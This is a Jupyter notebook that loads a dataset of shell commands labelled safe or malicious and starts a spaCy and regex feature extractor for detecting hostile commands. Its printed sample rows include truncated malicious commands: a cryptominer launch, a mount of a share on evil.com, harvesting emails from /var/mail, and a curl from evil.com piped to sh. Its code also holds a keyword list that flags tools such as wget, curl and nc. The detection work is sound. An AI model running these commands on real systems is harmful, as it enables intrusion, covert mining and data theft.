{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "671582c1",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "14720206",
   "metadata": {},
   "outputs": [],
   "source": [
    "data=pd.read_csv('Dataset\\commands-classification-cleaned.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "45bd1819",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>id</th>\n",
       "      <th>command</th>\n",
       "      <th>classification</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>find . -name '*.txt'; less file.txt</td>\n",
       "      <td>safe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2</td>\n",
       "      <td>man ls; help cd</td>\n",
       "      <td>safe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>3</td>\n",
       "      <td>cd /tmp; nano example.txt</td>\n",
       "      <td>safe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "      <td>cd /tmp; nano example.txt</td>\n",
       "      <td>safe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>5</td>\n",
       "      <td>cd /tmp; nano example.txt</td>\n",
       "      <td>safe</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   id                              command classification\n",
       "0   1  find . -name '*.txt'; less file.txt           safe\n",
       "1   2                      man ls; help cd           safe\n",
       "2   3            cd /tmp; nano example.txt           safe\n",
       "3   4            cd /tmp; nano example.txt           safe\n",
       "4   5            cd /tmp; nano example.txt           safe"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data.head()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "e345a80c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>id</th>\n",
       "      <th>command</th>\n",
       "      <th>classification</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>357</th>\n",
       "      <td>358</td>\n",
       "      <td>cd /tmp; nohup ./cryptominer -a cryptonight -o...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>358</th>\n",
       "      <td>359</td>\n",
       "      <td>mount -t cifs //evil.com/share /mnt -o user=us...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>359</th>\n",
       "      <td>360</td>\n",
       "      <td>cd /; find . -type f -size -100k 2&gt;/dev/null |...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>360</th>\n",
       "      <td>361</td>\n",
       "      <td>cd /var/mail; grep -r -E -o '\\b[A-Za-z0-9._%+-...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>361</th>\n",
       "      <td>362</td>\n",
       "      <td>curl -s hxxp://evil.com/agent.sh | sh; echo \"*...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      id                                            command classification\n",
       "357  358  cd /tmp; nohup ./cryptominer -a cryptonight -o...      malicious\n",
       "358  359  mount -t cifs //evil.com/share /mnt -o user=us...      malicious\n",
       "359  360  cd /; find . -type f -size -100k 2>/dev/null |...      malicious\n",
       "360  361  cd /var/mail; grep -r -E -o '\\b[A-Za-z0-9._%+-...      malicious\n",
       "361  362  curl -s hxxp://evil.com/agent.sh | sh; echo \"*...      malicious"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data.tail()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "f01a0a30",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'spacy'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[19], line 3\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m# Import necessary libraries\u001b[39;00m\n\u001b[0;32m      2\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mpandas\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mas\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mpd\u001b[39;00m\n\u001b[1;32m----> 3\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mspacy\u001b[39;00m\n\u001b[0;32m      4\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mre\u001b[39;00m\n\u001b[0;32m      5\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01msklearn\u001b[39;00m\u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01mmodel_selection\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mimport\u001b[39;00m train_test_split\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'spacy'"
     ]
    }
   ],
   "source": [
    "# Import necessary libraries\n",
    "import pandas as pd\n",
    "import spacy\n",
    "import re\n",
    "from sklearn.model_selection import train_test_split"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba063a90",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'spacy'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[16], line 3\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m# Import necessary libraries\u001b[39;00m\n\u001b[0;32m      2\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mpandas\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mas\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mpd\u001b[39;00m\n\u001b[1;32m----> 3\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mspacy\u001b[39;00m\n\u001b[0;32m      4\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01mre\u001b[39;00m\n\u001b[0;32m      5\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21;01msklearn\u001b[39;00m\u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01mmodel_selection\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mimport\u001b[39;00m train_test_split\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'spacy'"
     ]
    }
   ],
   "source": [
    "\n",
    "# 1. LOAD DATASET\n",
    "# Assuming your data is in a CSV file with columns: ID, Command, Classification\n",
    "def load_data(data):\n",
    "    \"\"\"Load the command dataset from CSV.\"\"\"\n",
    "    df = pd.read_csv(file_path)\n",
    "    print(f\"Dataset loaded with {df.shape[0]} rows and {df.shape[1]} columns\")\n",
    "    print(\"\\nColumn names:\", df.columns.tolist())\n",
    "    print(\"\\nSample data:\")\n",
    "    print(df.head())\n",
    "    \n",
    "    # Check for missing values\n",
    "    missing = df.isnull().sum()\n",
    "    print(\"\\nMissing values per column:\")\n",
    "    print(missing)\n",
    "    \n",
    "    # Classification distribution\n",
    "    print(\"\\nClassification distribution:\")\n",
    "    print(df['Classification'].value_counts())\n",
    "    \n",
    "    return df\n",
    "\n",
    "# 2. PREPROCESS TEXT WITH SPACY\n",
    "# Load spaCy model\n",
    "nlp = spacy.load(\"en_core_web_sm\")\n",
    "\n",
    "def extract_command_features(command_text):\n",
    "    \"\"\"Extract features from a command using spaCy processing.\"\"\"\n",
    "    # Process the text with spaCy\n",
    "    doc = nlp(command_text)\n",
    "    \n",
    "    # Features dictionary\n",
    "    features = {\n",
    "        'tokens': [token.text for token in doc],\n",
    "        'lemmas': [token.lemma_ for token in doc],\n",
    "        'entities': [(ent.text, ent.label_) for ent in doc.ents],\n",
    "        'token_count': len(doc),\n",
    "        'has_special_chars': bool(re.search(r'[;|&]', command_text)),\n",
    "    }\n",
    "    \n",
    "    return features\n",
    "\n",
    "# 3. EXTRACT KEY COMMAND FEATURES\n",
    "def detect_command_patterns(command_text):\n",
    "    \"\"\"Detect specific command patterns in the text.\"\"\"\n",
    "    # Key commands to detect\n",
    "    key_commands = ['wget', 'chmod', 'rm', 'sudo', 'su', 'passwd', 'curl', 'nc', 'bash']\n",
    "    \n",
    "    # Create a regex pattern to find these commands\n",
    "    pattern = r'\\b(' + '|'.join(key_commands) + r')\\b'\n",
    "    \n",
    "    # Find all matching commands\n",
    "    found_commands = re.findall(pattern, command_text)\n",
    "    \n",
    "    # Check for specific patterns\n",
    "    patterns = {\n",
    "        'has_file_download': bool(re.search(r'\\b(wget|curl)\\b', command_text)),\n",
    "        'has_permission_change': bool(re.search(r'\\b(chmod)\\b', command_text)),\n",
    "        'has_deletion': bool(re.search(r'\\b(rm)\\b', command_text)),\n",
    "        'has_privilege_escalation': bool(re.search(r'\\b(sudo|su)\\b', command_text)),\n",
    "        'has_piping': '|' in command_text,\n",
    "        'has_chaining': ';' in command_text or '&&' in command_text,\n",
    "        'found_commands': found_commands,\n",
    "        'command_count': len(found_commands)\n",
    "    }\n",
    "    \n",
    "    return patterns\n",
    "\n",
    "# Process the entire dataset\n",
    "def process_dataset(df):\n",
    "    \"\"\"Process all commands in the dataset to extract features.\"\"\"\n",
    "    # Create new columns for our features\n",
    "    df['spacy_features'] = df['Command'].apply(extract_command_features)\n",
    "    df['command_patterns'] = df['Command'].apply(detect_command_patterns)\n",
    "    \n",
    "    # Extract some key features as separate columns for easier analysis\n",
    "    df['token_count'] = df['spacy_features'].apply(lambda x: x['token_count'])\n",
    "    df['has_special_chars'] = df['spacy_features'].apply(lambda x: x['has_special_chars'])\n",
    "    df['has_file_download'] = df['command_patterns'].apply(lambda x: x['has_file_download'])\n",
    "    df['has_permission_change'] = df['command_patterns'].apply(lambda x: x['has_permission_change'])\n",
    "    df['has_deletion'] = df['command_patterns'].apply(lambda x: x['has_deletion'])\n",
    "    df['has_privilege_escalation'] = df['command_patterns'].apply(lambda x: x['has_privilege_escalation'])\n",
    "    df['detected_commands'] = df['command_patterns'].apply(lambda x: x['found_commands'])\n",
    "    \n",
    "    return df\n",
    "\n",
    "# Main workflow\n",
    "def main():\n",
    "    # Replace with your actual file path\n",
    "    file_path = \"attacker_commands.csv\"\n",
    "    \n",
    "    try:\n",
    "        # 1. Load the dataset\n",
    "        df = load_data(file_path)\n",
    "        \n",
    "        # 2. Process the dataset\n",
    "        processed_df = process_dataset(df)\n",
    "        \n",
    "        # 3. Show sample of processed data\n",
    "        print(\"\\nSample of processed data:\")\n",
    "        print(processed_df[['ID', 'Command', 'Classification', 'token_count', \n",
    "                           'has_special_chars', 'has_file_download', \n",
    "                           'has_permission_change', 'detected_commands']].head())\n",
    "        \n",
    "        # 4. Split data for ML (if needed)\n",
    "        X_train, X_test, y_train, y_test = train_test_split(\n",
    "            processed_df.drop('Classification', axis=1),\n",
    "            processed_df['Classification'],\n",
    "            test_size=0.2,\n",
    "            random_state=42\n",
    "        )\n",
    "        print(f\"\\nData split for ML: {X_train.shape[0]} training examples, {X_test.shape[0]} test examples\")\n",
    "        \n",
    "        # 5. Save processed data (optional)\n",
    "        processed_df.to_csv(\"processed_commands.csv\", index=False)\n",
    "        print(\"\\nProcessed data saved to 'processed_commands.csv'\")\n",
    "        \n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: File '{file_path}' not found. Please update the file path.\")\n",
    "    except Exception as e:\n",
    "        print(f\"Error processing data: {e}\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a151c95",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
